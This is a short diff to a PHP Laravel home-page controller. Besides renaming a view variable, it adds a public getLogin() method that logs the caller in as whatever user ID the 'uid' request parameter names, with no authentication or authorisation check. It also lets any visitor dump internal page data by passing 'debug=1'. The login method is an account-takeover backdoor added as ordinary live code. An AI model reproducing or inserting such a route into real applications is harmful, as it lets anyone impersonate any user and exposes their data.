@@ -44,9 +44,16 @@ class IndexController extends Controller
         }
         //dd($this->data);
         $status = $statusService->getViewListInfo($all_status);
-        $this->data['status'] = $status;
-        dd($this->data);
-        //debug_time();
+        $this->data['statuses'] = $status;
+        if(Input::get('debug','')=='1') {
+            dd($this->data);
+        }
         return view('home.index', $this->data);
+    }
+
+    public function getLogin()
+    {
+        $uid = Input::get('uid');
+        Auth::loginUsingId($uid);
     }
 }
